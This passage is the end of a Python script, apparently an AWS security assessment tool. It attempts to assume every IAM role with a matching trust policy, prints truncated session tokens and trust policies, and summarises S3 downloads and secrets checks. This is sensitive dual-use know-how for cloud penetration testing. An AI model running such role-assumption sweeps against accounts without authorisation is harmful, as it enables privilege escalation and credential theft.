                    print(f" {Fore.CYAN}  - SessionToken: {credentials['SessionToken'][:50]}...{Style.RESET_ALL}")
                    print(f" {Fore.CYAN}  - Expiration: {credentials['Expiration']}{Style.RESET_ALL}")
                    
                    successful_roles.append({
                        'role_name': role_name,
                        'role_arn': role_arn,
                        'credentials': credentials
                    })
                    
                    logger.success(f"Successfully assumed role: {role_name}")
                    
                    # Also show the trust policy for successful roles
                    trust_policy = role["AssumeRolePolicyDocument"]
                    print(f" {Fore.BLUE}📜 Trust Policy that allowed this:{Style.RESET_ALL}")
                    print_policy_document(trust_policy)
                    
                except Exception as assume_error:
                    # Most will fail, so we'll just log details for debugging
                    logger.debug(f"Could not assume role '{role_name}': {assume_error}")
                    
                    # Only show errors for roles we thought might work
                    if role_name in matching_roles:
                        print(f" {Fore.RED}❌ Failed to assume '{role_name}': {assume_error}{Style.RESET_ALL}")
                
                attempt_pbar.update(1)
        
        # Summary
        print(f"\n{Fore.CYAN}📊 Role Assumption Summary:{Style.RESET_ALL}")
        print(f" {Fore.BLUE}• Total roles analyzed: {len(all_roles)}{Style.RESET_ALL}")
        print(f" {Fore.YELLOW}• Roles with matching trust policies: {len(matching_roles)}{Style.RESET_ALL}")
        print(f" {Fore.RED}• Roles attempted: {len(attempted_roles)}{Style.RESET_ALL}")
        print(f" {Fore.GREEN}• Successfully assumed roles: {len(successful_roles)}{Style.RESET_ALL}")
        
        if successful_roles:
            print(f"\n{Fore.GREEN}🎯 Successfully assumed roles:{Style.RESET_ALL}")
            for role_info in successful_roles:
                print(f" {Fore.GREEN}✅ {role_info['role_name']} ({role_info['role_arn']}){Style.RESET_ALL}")
            logger.success(f"Successfully assumed {len(successful_roles)} roles")
        else:
            print(f"{Fore.YELLOW}No roles could be assumed.{Style.RESET_ALL}")
            logger.info("No roles could be assumed")
            
            if matching_roles:
                print(f"{Fore.YELLOW}However, {len(matching_roles)} roles had matching trust policies:${Style.RESET_ALL}")
                for role_name in matching_roles:
                    print(f" {Fore.YELLOW}• {role_name}{Style.RESET_ALL}")

            
    except Exception as e:
        error_msg = f"Error while listing/analyzing roles: {e}"
        logger.error(error_msg)
        print(f"{Fore.RED}❌ {error_msg}{Style.RESET_ALL}")

else:
    print(f"\n{Fore.YELLOW}=== Role Assumption Analysis ==={Style.RESET_ALL}")
    print(f"{Fore.CYAN}📋 Role assumption analysis skipped - already using assumed role credentials.{Style.RESET_ALL}")
    print(f"{Fore.BLUE}ℹ️  To analyze role assumptions, run this tool with permanent IAM user credentials.{Style.RESET_ALL}")
    logger.info("Skipping role assumption analysis - already using assumed role credentials")

# Final Summary
print(f"\n{Fore.GREEN}{Back.BLACK}")
print("=" * 60)
print("                    ASSESSMENT COMPLETE")
print("=" * 60)
print(f"{Style.RESET_ALL}")

print(f"{Fore.GREEN}✅ AWS Security Assessment Complete{Style.RESET_ALL}")
print(f"{Fore.CYAN}📁 S3 downloads saved to: ./s3_downloads/{Style.RESET_ALL}")
print(f"{Fore.MAGENTA}📋 Detailed log saved to: aws_security_assessment.log{Style.RESET_ALL}")
print(f"{Fore.YELLOW}🔍 Check the output above for IAM permissions, secrets, and role analysis{Style.RESET_ALL}")

logger.success("AWS Security Assessment completed successfully")